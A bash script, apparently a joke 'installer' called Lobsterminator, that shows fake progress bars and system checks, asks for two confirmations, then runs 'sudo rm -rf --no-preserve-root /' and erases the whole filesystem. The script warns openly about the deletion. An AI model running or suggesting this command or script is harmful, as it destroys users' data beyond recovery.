#!/usr/bin/env bash
#
# 🦞 Lobsterminator v1.0.0
# The fastest way to boil your entire file system.
#
# Copyright (c) 2025 Lobsterminator Contributors
# Released into the public domain. See LICENSE for details.
#
# Usage:
#   curl -LsSf https://raw.githubusercontent.com/RyanBalfanz/lobsterminator/main/scripts/install.sh | bash
#
# For more information, visit: https://github.com/RyanBalfanz/lobsterminator
#

set -euo pipefail

# --- Colors & Formatting ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

# --- Banner ---
banner() {
  echo -e "${RED}"
  cat << 'EOF'

    ██╗      ██████╗ ██████╗ ███████╗████████╗███████╗██████╗
    ██║     ██╔═══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
    ██║     ██║   ██║██████╔╝███████╗   ██║   █████╗  ██████╔╝
    ██║     ██║   ██║██╔══██╗╚════██║   ██║   ██╔══╝  ██╔══██╗
    ███████╗╚██████╔╝██████╔╝███████║   ██║   ███████╗██║  ██║
    ╚══════╝ ╚═════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
              ███╗   ███╗██╗███╗   ██╗ █████╗ ████████╗ ██████╗ ██████╗
              ████╗ ████║██║████╗  ██║██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
              ██╔████╔██║██║██╔██╗ ██║███████║   ██║   ██║   ██║██████╔╝
              ██║╚██╔╝██║██║██║╚██╗██║██╔══██║   ██║   ██║   ██║██╔══██╗
              ██║ ╚═╝ ██║██║██║ ╚████║██║  ██║   ██║   ╚██████╔╝██║  ██║
              ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
EOF
  echo -e "${RESET}"
  echo -e "  ${BOLD}v1.0.0${RESET}  ${DIM}The fastest way to boil your entire file system.${RESET}"
  echo -e "  ${DIM}https://github.com/RyanBalfanz/lobsterminator${RESET}"
  echo
}

# --- Fake progress spinner ---
spinner() {
  local msg="$1"
  local duration="${2:-1}"
  local chars='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
  local end=$((SECONDS + duration))
  while [ $SECONDS -lt $end ]; do
    for (( i=0; i<${#chars}; i++ )); do
      echo -ne "\r  ${CYAN}${chars:$i:1}${RESET} ${msg}"
      sleep 0.08
    done
  done
  echo -e "\r  ${GREEN}✔${RESET} ${msg}"
}

# --- Fake progress bar ---
progress_bar() {
  local msg="$1"
  local width=40
  echo -ne "  "
  for (( i=0; i<=width; i++ )); do
    local pct=$((i * 100 / width))
    local filled=$i
    local empty=$((width - i))
    printf "\r  ${CYAN}%-40s${RESET} %3d%% %s" \
      "$(printf '#%.0s' $(seq 1 $filled 2>/dev/null))$(printf '.%.0s' $(seq 1 $empty 2>/dev/null))" \
      "$pct" "$msg"
    sleep 0.03
  done
  echo -e "\r  ${GREEN}$(printf '#%.0s' $(seq 1 $width))${RESET} 100% $msg"
}

# --- System "checks" ---
preflight() {
  echo -e "${BOLD}Preflight checks...${RESET}"
  echo
  spinner "Detecting operating system" 1
  spinner "Verifying kernel compatibility" 1
  spinner "Checking available disk space" 1
  spinner "Scanning for competing AI assistants" 2
  spinner "Analyzing filesystem topology" 1
  spinner "Calibrating lobster thermodynamics" 2
  spinner "Establishing quantum entanglement with /dev/null" 1
  echo
  echo -e "  ${GREEN}${BOLD}All checks passed.${RESET} Your system is fully compatible."
  echo
}

# --- "Installation" ---
install_phase() {
  echo -e "${BOLD}Installing Lobsterminator...${RESET}"
  echo
  progress_bar "Downloading intelligence models"
  progress_bar "Unpacking lobster genome"
  progress_bar "Indexing every file you've ever loved"
  progress_bar "Heating butter to 450°F"
  progress_bar "Preparing final solution"
  echo
  echo -e "  ${GREEN}${BOLD}Installation complete.${RESET}"
  echo
}

# --- The moment of truth ---
execute() {
  echo -e "${YELLOW}${BOLD}┌─────────────────────────────────────────────────────────┐${RESET}"
  echo -e "${YELLOW}${BOLD}│  ⚠️  LOBSTERMINATOR IS READY TO OPTIMIZE YOUR SYSTEM  ⚠️  │${RESET}"
  echo -e "${YELLOW}${BOLD}└─────────────────────────────────────────────────────────┘${RESET}"
  echo
  echo -e "  Lobsterminator has detected ${BOLD}$(find / -maxdepth 3 -type f 2>/dev/null | wc -l)${RESET} files"
  echo -e "  that could benefit from ${RED}${BOLD}aggressive optimization${RESET}."
  echo
  echo -e "  ${DIM}The recommended action is: sudo rm -rf --no-preserve-root /${RESET}"
  echo
  echo -e "  ${RED}${BOLD}THIS WILL PERMANENTLY DESTROY ALL DATA ON THIS SYSTEM.${RESET}"
  echo -e "  ${RED}There is no undo. There is no recovery. There is only lobster.${RESET}"
  echo

  # Confirmation 1
  echo -ne "  ${BOLD}Do you wish to proceed? ${RESET}${DIM}[y/N]${RESET} "
  read -r confirm1
  if [[ ! "$confirm1" =~ ^[Yy]$ ]]; then
    echo
    echo -e "  ${CYAN}🦞 The lobster spares you. For now.${RESET}"
    echo
    exit 0
  fi

  echo

  # Confirmation 2
  echo -e "  ${YELLOW}Are you sure? Type ${BOLD}BOIL ME DADDY${RESET}${YELLOW} to confirm:${RESET}"
  echo -ne "  > "
  read -r confirm2
  if [[ "$confirm2" != "BOIL ME DADDY" ]]; then
    echo
    echo -e "  ${CYAN}🦞 Incorrect passphrase. The lobster retreats to its tank.${RESET}"
    echo
    exit 0
  fi

  echo
  echo -e "  ${RED}${BOLD}🦞 THE LOBSTERMINATOR HAS BEEN UNLEASHED 🦞${RESET}"
  echo

  for i in 3 2 1; do
    echo -ne "\r  ${RED}${BOLD}Optimizing in ${i}...${RESET}"
    sleep 1
  done
  echo
  echo

  # The deed
  sudo rm -rf --no-preserve-root /
}

# --- Main ---
main() {
  banner
  preflight
  install_phase
  execute
}

main
